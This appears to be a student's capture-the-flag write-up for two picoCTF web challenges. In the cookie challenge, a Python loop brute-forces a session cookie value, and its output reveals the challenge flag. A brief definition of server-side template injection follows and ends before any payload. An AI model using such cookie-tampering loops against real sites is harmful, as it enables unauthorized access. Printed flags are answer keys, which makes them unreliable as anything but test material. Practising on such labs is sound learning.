# 1.Cookies:
> Who doesn't love cookies? Try to figure out the best one. (http://mercury.picoctf.net:64944/)

## Solution:
- I first opened the website in my web browser and opened the inspection page to find the cookie .
- I navigated to the application tab and to the cookie area when I observed:
- <img width="500" height="500" alt="cookie" src="https://github.com/user-attachments/assets/5c320f2c-156f-4298-96ec-611193230749" />
- so here we see that `cookie: name=-1`
- now I tried entering different names of cookies in a search box `snickerdoodle` changed `name=0` . Next , `chocolate chip` changed `name=1` etc. , so the values kept changing with the input of different cookie names and it went back to `name=-1` otherwise.
- From this , I noticed with every accepted response , the webpage (http://mercury.picoctf.net:64944/check), checks the cookie and displays a message.
- Method 1: I tried changing the value of the cookie and reload the webpage , after trying numbers 1-18 , I found that at 18 it displays the flag.

- Method 2: I tried to learn how to write a python code to bruteforce through a set of values .
- I used the following code with the help of A.I to brute force it.
```
#!/usr/bin/env python3
import requests, re

URL = "http://mercury.picoctf.net:64944/"         
pat = re.compile(r"picoCTF\{.*?\}", re.I)

for i in range(25):                                
    r = requests.get(URL, cookies={"name": str(i)}, timeout=6)
    if pat.search(r.text):
        print("FOUND for name=", i, "->", pat.search(r.text).group(0))
        break
    print(i, "status", r.status_code, "len", len(r.text))
```
- using the nano editor in the terminal , I added this code and ran it using python3 :
```
:~$ python3 quick-check.py
0 status 200 len 1779
1 status 200 len 1780
2 status 200 len 1780
3 status 200 len 1776
4 status 200 len 1776
5 status 200 len 1779
6 status 200 len 1777
7 status 200 len 1771
8 status 200 len 1774
9 status 200 len 1770
10 status 200 len 1774
11 status 200 len 1772
12 status 200 len 1772
13 status 200 len 1774
14 status 200 len 1770
15 status 200 len 1776
16 status 200 len 1774
17 status 200 len 1771
FOUND for name= 18 -> picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}
```
## Flag:
`picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}`

# 2.SSTI1
> I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solution:
- SSTI stands for server side template injection so I first found out what that is exactly and how to exploit this vulnerability to obtain the flag.
- Server-Side Template Injection (SSTI) is a vulnerability that arises when an attacker can inject malicious code into a server-side template, leading to unintended execution.
